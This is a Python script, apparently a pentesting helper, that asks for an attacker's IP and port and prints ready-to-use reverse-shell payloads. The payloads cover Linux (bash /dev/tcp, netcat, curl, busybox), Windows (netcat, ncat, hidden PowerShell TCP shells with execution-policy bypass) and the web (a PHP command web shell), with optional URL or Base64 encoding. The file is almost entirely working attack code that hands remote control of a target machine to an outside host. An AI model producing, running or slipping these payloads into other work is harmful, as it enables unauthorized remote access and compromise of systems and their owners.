#!/bin/python3

from termcolor import colored
import ipaddress
import base64
import urllib.parse


# Print the banner
banner_lines = [
    ' █     █░ ██░ ██  ▄▄▄      ▄▄▄█████▓   ▄▄▄█████▓ ██░ ██ ▓█████      ██████  ██░ ██ ▓█████  ██▓     ██▓ ',
    '▓█░ █ ░█░▓██░ ██▒▒████▄    ▓  ██▒ ▓▒   ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒ ',
    '▒█░ █ ░█ ▒██▀▀██░▒██  ▀█▄  ▒ ▓██░ ▒░   ▒ ▓██░ ▒░▒██▀▀██░▒███      ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    ',
    '░█░ █ ░█ ░▓█ ░██ ░██▄▄▄▄██ ░ ▓██▓ ░    ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄      ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    ',
    '░░██▒██▓ ░▓█▒░██▓ ▓█   ▓██▒  ▒██▒ ░      ▒██▒ ░ ░▓█▒░██▓░▒████▒   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒',
    '░ ▓░▒ ▒   ▒ ░░▒░▒ ▒▒   ▓▒█░  ▒ ░░        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░',
    '  ▒ ░ ░   ▒ ░▒░ ░  ▒   ▒▒ ░    ░           ░     ▒ ░▒░ ░ ░ ░  ░   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░'
    '\nBy DownwithmyDaemons'
]
for line in banner_lines:
    print(colored(line, 'red'))

# Input Validation for IP
def is_valid_ip(target):
    try:
        ip_obj = ipaddress.ip_address(target)
        return True
    except ValueError:
        print(f"ERROR: {target} is not a valid IP address")
        return False

# Define attack host IP
while True:
    target = input("What is the IP of your attack box? ")
    if is_valid_ip(target):
        break
    else:
        print("Please enter a valid IP address.")

# Input Validation for Port
def is_valid_port(port):
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return True
        else:
            print("Port must be between 1 and 65535.")
            return False
    except ValueError:
        print("Port must be an integer.")
        return False

# Define Port we are listening on 
while True:
    port = input("What is the listening Port on your attack box? ")
    if is_valid_port(port):
        break

print("What is the Target system? \n[1] Linux \n[2] Windows \n[3] Web")
host = input("\nPlease select Target from the above: ")

# URL Encode function
def url_encode(payload):
    return urllib.parse.quote_plus(payload)

# Base64 Encode function
def base64_encode(payload):
    return base64.b64encode(payload.encode()).decode()

# Linux target
if host == "1":
    print("\n Linux payload list: \n [1] Bash -i\n [2] bash 196\n [3] nc mkfifo\n [4] nc -e\n [5] nc -c\n [6] curl\n [7] busybox")
    lin_payload = input("\nPlease select a payload: ")
    # Linux Payloads
    payloads = {
        "1": f'sh -i >& /dev/tcp/{target}/{port} 0>&1',
        "2": f'0<&196;exec 196<>/dev/tcp/{target}/{port}1; sh <&196 >&196 2>&196',
        "3": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {target} {port} >/tmp/f',
        "4": f'nc {target} {port} -e sh',
        "5": f'nc -c sh {target} {port}',
        "6": f"C='curl -Ns telnet://{target}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",
        "7": f"busybox nc {target} {port} -e sh"
    }
    selected_payload = payloads.get(lin_payload, "No valid payload selected, quitting")
    if selected_payload != "No valid payload selected, quitting":
        print("Select encoding option:\n[1] None\n[2] URL Encode\n[3] Base64 Encode")
        encoding_option = input("Please select encoding: ")
        if encoding_option == "2":
            selected_payload = url_encode(selected_payload)
        elif encoding_option == "3":
            selected_payload = base64_encode(selected_payload)
        print(selected_payload)
    else:
        print(selected_payload)

# Windows target
elif host == "2":
    print("\n Windows payload list: \n [1] nc.exe\n [2] ncat.exe\n [3] Powershell 1\n [4] Powershell V2")
    win_payload = input("\nPlease select a payload: ")
    # Windows Payloads
    payloads = {
        "1": f'nc.exe {target} {port} -e cmd.exe',
        "2": f'ncat.exe {target} {port} -e cmd.exe',
        "3": (
            f'powershell -nop -w hidden -noni -ep bypass -c '
            f'$TCPClient = New-Object Net.Sockets.TCPClient("{target}", {port});'
            f'$NetworkStream = $TCPClient.GetStream();'
            f'$StreamReader = New-Object IO.StreamReader($NetworkStream);'
            f'$StreamWriter = New-Object IO.StreamWriter($NetworkStream);'
            f'$Buffer = New-Object byte[] 1024;'
            f'while ($true) {{'
            f'$StreamWriter.Write("SHELL> ");'
            f'$StreamWriter.Flush();'
            f'$BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length);'
            f'if ($BytesRead -eq 0) {{ break; }}'
            f'$Command = [text.encoding]::UTF8.GetString($Buffer, 0, $BytesRead);'
            f'$Output = Invoke-Expression $Command 2>&1 | Out-String;'
            f'$StreamWriter.Write($Output);'
            f'$StreamWriter.Flush();'
            f'}}'
            f'$StreamWriter.Close();'
        ),
                "4": (
            f'$LHOST = "{target}"; $LPORT = {port}; '
            f'$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); '
            f'$NetworkStream = $TCPClient.GetStream(); '
            f'$StreamReader = New-Object IO.StreamReader($NetworkStream); '
            f'$StreamWriter = New-Object IO.StreamWriter($NetworkStream); '
            f'$StreamWriter.AutoFlush = $true; '
            f'$Buffer = New-Object System.Byte[] 1024; '
            f'while ($TCPClient.Connected) {{ '
            f'while ($NetworkStream.DataAvailable) {{ '
            f'$RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); '
            f'$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) '
            f'}};'
            f'if ($TCPClient.Connected -and $Code.Length -gt 1) {{ '
            f'$Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; '
            f'$StreamWriter.Write("$Output`n"); '
            f'$Code = $null '
            f'}}'
            f'}}'
            f'$TCPClient.Close(); '
            f'$NetworkStream.Close(); '
            f'$StreamReader.Close(); '
            f'$StreamWriter.Close()'
        )    
    }
    selected_payload = payloads.get(win_payload, "No valid payload selected, quitting")
    if selected_payload != "No valid payload selected, quitting":
        print("Select encoding option:\n[1] None\n[2] URL Encode\n[3] Base64 Encode")
        encoding_option = input("Please select encoding: ")
        if encoding_option == "2":
            selected_payload = url_encode(selected_payload)
        elif encoding_option == "3":
            selected_payload = base64_encode(selected_payload)
        print(selected_payload)
    else:
        print(selected_payload)

# Web target
elif host == "3":
    print("\n Web payload list: \n [1] PHP cmd shell")
    web_payload = input("\nPlease select a payload: ")
    # Web Payloads
    payloads = {
        "1": "<?php system($_REQUEST['cmd']); ?>"
    }
    selected_payload = payloads.get(web_payload, "No valid payload selected, quitting")
    if selected_payload != "No valid payload selected, quitting":
        print("Select encoding option:\n[1] None\n[2] URL Encode\n[3] Base64 Encode")
        encoding_option = input("Please select encoding: ")
        if encoding_option == "2":
            selected_payload = url_encode(selected_payload)
        elif encoding_option == "3":
            selected_payload = base64_encode(selected_payload)
        print(selected_payload)
    else:
        print(selected_payload)
# Invalid target
else:
    print("Please select a valid target!")
